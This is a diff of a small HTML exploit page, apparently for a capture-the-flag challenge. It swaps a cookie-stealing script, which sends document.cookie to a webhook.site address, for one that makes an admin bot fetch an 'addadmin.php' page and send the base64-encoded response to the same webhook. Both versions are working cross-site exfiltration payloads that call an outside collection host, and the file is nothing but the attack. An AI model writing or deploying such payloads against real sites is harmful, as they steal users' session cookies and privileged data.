@@ -1,14 +1,15 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="UTF-8">
-  <title>Steal Cookie</title>
-</head>
+<head><title>Exploit</title></head>
 <body>
 <script>
-  // try to grab cookie
-  var i = new Image();
-  i.src = "https://webhook.site/5aad0fcd-0ad2-48bb-950c-7265ce3113da?c=" + document.cookie;
+  // Force admin bot to load the secret page
+  fetch("https://skrctf.me/ports/71f73fb1e3b7d6dc0b4f82f76ae542fd/addadmin.php")
+    .then(r => r.text())
+    .then(t => {
+        // send the response text (the flag) to your webhook
+        fetch("https://webhook.site/5aad0fcd-0ad2-48bb-950c-7265ce3113da?flag=" + btoa(t));
+    });
 </script>
 </body>
 </html>
